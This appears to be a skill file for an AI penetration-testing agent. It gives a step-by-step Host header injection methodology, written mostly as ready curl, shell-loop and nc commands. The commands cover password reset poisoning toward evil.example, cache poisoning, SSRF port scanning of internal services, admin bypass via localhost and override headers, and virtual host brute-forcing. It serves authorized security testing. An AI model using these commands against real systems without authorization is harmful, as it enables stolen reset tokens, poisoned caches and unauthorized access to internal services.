---
name: host-header-injection
description: Exploit Host header manipulation for password reset poisoning, cache poisoning, SSRF, and access control bypass
origin: Vigil
vuln_class: host-header-injection
---

# Host Header Injection

> **`vigil assess kali` audit flags:** use `--technique OTHER` (Host-header injection spans cache poisoning, password-reset poisoning, and virtual-host confusion). Switch to `SSRF` when the Host header re-routes the server to an attacker-chosen backend.

## When to Activate

- Application reflects the Host header in response body, URLs, redirects, or email links
- Password reset or account recovery flow generates links from the Host header
- Target sits behind a reverse proxy, load balancer, or CDN that may process Host differently than the origin
- Admin panels or internal endpoints gated by hostname-based access control

## Tools

- `vigil assess kali exec -- curl ...` (Host header manipulation, override header injection, response inspection — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30`)
- Browser DevTools (verify reflected Host in rendered pages and network responses)
- `vigil oob mint` / `vigil oob poll` — for the SSRF-via-Host vector (§4) and password-reset poisoning (§2): `mint` binds the nonce under a running client's interactsh id and prints the exact callback host (`$OOB_HOST`, of shape `<nonce>.<client-id>.researcher.example`) so `poll` can correlate it — pass `--client <name>` when several clients run. Send the exact host mint prints in the `Host`/`X-Forwarded-Host` header, then `poll` to confirm the backend resolved it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`; start a named client with `vigil oob client start <name> --engagement <key> --agent <agent>` if none is running.
- `vigil assess anomaly-score` — for virtual-host enumeration (§6) and Host-based port scanning (§4): pipe the per-Host response records (status/length) and let it rank the odd-one-out instead of eyeballing the loop output.

## Methodology

### 1. Detection -- Test Host Header Reflection
- [ ] Send modified Host header, check if reflected in response body, Location header, or generated URLs
```bash
curl -v -H "Host: evil.example" https://target/
```
- [ ] Check these alternative/override headers:
```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-Original-URL
X-Rewrite-URL
X-HTTP-Host-Override
Forwarded: host=evil.example
```
```bash
curl -v -H "X-Forwarded-Host: evil.example" https://target/
curl -v -H "X-Host: evil.example" https://target/
curl -v -H "X-Forwarded-Server: evil.example" https://target/
curl -v -H "Forwarded: host=evil.example" https://target/
```
- [ ] Double Host header: send two Host headers, observe which one the app uses vs which the proxy routes on
```bash
curl -v -H "Host: target.example" -H "Host: evil.example" https://target/
```

### 2. Password Reset Poisoning
- [ ] Trigger password reset for victim account
- [ ] Inject attacker domain in Host header: `Host: evil.example`
```bash
curl -X POST https://target/password-reset -H "Host: evil.example" -d "email=victim@target.example"
```
- [ ] If reset email contains Host-derived URL, victim clicks link to attacker server -- token captured
- [ ] Test with X-Forwarded-Host if Host is locked
```bash
curl -X POST https://target/password-reset -H "X-Forwarded-Host: evil.example" -d "email=victim@target.example"
```

### 3. Cache Poisoning via Host Header
> **Dispatch note:** For full cache poisoning methodology (unkeyed headers, CDN-specific behavior, Param Miner), load `agent/skills/cache-poisoning/SKILL.md`. This section covers only the Host-header-specific cache poisoning vector.
- [ ] If Host header is reflected in cached response (script src, CSS link, redirect), and Host is NOT part of cache key:
  - Poison cache with `Host: evil.example` -- stored response serves attacker-controlled resources to all users
- [ ] Check: send request with evil Host, then send normal request -- does the poisoned response serve?
```bash
# Poison with cache buster first to avoid production impact
curl -H "X-Forwarded-Host: evil.example" "https://target/page?cb=$(openssl rand -hex 4)"
# Then check if poisoned response is served without the header
curl "https://target/page?cb=<same-value>"
```
- [ ] Use cache busters (`?cb=<random>`) during detection to avoid poisoning production

### 4. SSRF via Host Header
- [ ] Internal port scanning: `Host: localhost:PORT` for common internal ports (22, 80, 443, 3306, 6379, 8080, 9200). Emit one JSON record per port so the odd-one-out (the open internal port) surfaces instead of being eyeballed:
```bash
for port in 22 80 443 3306 6379 8080 9200; do
  read -r code size <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -H "Host: localhost:$port" https://target/)"
  printf '{"url":"localhost:%s","status":%s,"content_length":%s}\n' "$port" "$code" "$size"
done | vigil assess anomaly-score --top 5
```
  The top-ranked record's `anomalous_attributes` (e.g. `status='200'`, `length_bucket='len_512_4096'`) is the port whose response broke from the closed-port baseline — that is your reachable internal service.
- [ ] Internal host access: `Host: 192.168.1.1`, `Host: 10.0.0.1`
- [ ] Blind SSRF confirmation when no response diff leaks: mint a callback host and route the server to it via the Host header, then poll for the hit:
```bash
vigil oob mint --client <name> --technique ssrf --target-url https://target/ --param Host --probe-kind host-header
# → host  <nonce>.<client-id>.researcher.example   (= $OOB_HOST)
curl -H "Host: $OOB_HOST" https://target/
vigil oob poll --client <name>    # a matched row = the backend resolved your Host
```

### 5. Access Control Bypass
- [ ] Internal-only endpoints gated by Host header: try `Host: localhost`, `Host: 127.0.0.1`, `Host: internal.app`
```bash
curl -v -H "Host: localhost" https://target/admin
curl -v -H "Host: 127.0.0.1" https://target/admin
```
- [ ] Admin panel routing: `X-Original-URL: /admin` or `X-Rewrite-URL: /admin` to bypass front-end path restrictions
```bash
curl -v -H "X-Original-URL: /admin" https://target/
curl -v -H "X-Rewrite-URL: /admin" https://target/
```

### 6. Virtual Host Enumeration
- [ ] Brute-force Host header with known/guessed subdomains to discover hidden vhosts. Capture each response as a record and rank the outlier — the hidden vhost is the one whose status/length diverges from the default-vhost cluster:
```bash
for sub in admin staging internal api dev test backend; do
  read -r code size <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -H "Host: $sub.target.example" https://target/)"
  printf '{"url":"%s.target.example","status":%s,"content_length":%s}\n' "$sub" "$code" "$size"
done | vigil assess anomaly-score --top 5
```
- [ ] The top-ranked record is the Host whose response broke from the pack (e.g. `internal.target.example` returns a 200 + larger body where the rest 404) = hidden virtual host found. A flat ranking (every score ~0) means every Host returns the same default vhost — no hidden vhost on this wordlist.

### 7. Connection-State Attacks
- [ ] On persistent connections (keep-alive), first request with legit Host, second with internal Host
```bash
printf "GET / HTTP/1.1\r\nHost: target.example\r\nConnection: keep-alive\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc target.example 80
```
- [ ] May bypass Host validation that only checks the first request per connection

## What to Record

- Injection vector (Host header, X-Forwarded-Host, double Host, other override header)
- Exact request that triggers the behavior (full curl command with headers)
- Where the injected value appears (response body, Location header, email link, cached response), or — for blind Host-based SSRF — the matched probe<->callback pair from `vigil oob poll --client <name> --json`
- Impact: password reset token theft, cache poisoning serving attacker resources, internal service access, admin panel bypass — confirming the Host value is reflected is not enough; you must show the **attacker outcome** (e.g., password reset link in victim's email points to attacker domain and token was captured, poisoned cache entry serves attacker script to victim browsers, internal admin panel is accessible without authentication)
- Whether override headers bypass Host-locked protections
- Full request/response pairs for reproducibility

## Extended Resources

- `agent/skills/cache-poisoning/SKILL.md` -- for deeper cache poisoning methodology when Host-based cache poisoning is confirmed
- `agent/skills/ssrf-testing/SKILL.md` -- for deeper SSRF exploitation when Host-based SSRF is confirmed
- `agent/skills/open-redirect-testing/SKILL.md` -- when Host injection produces redirect-based impact
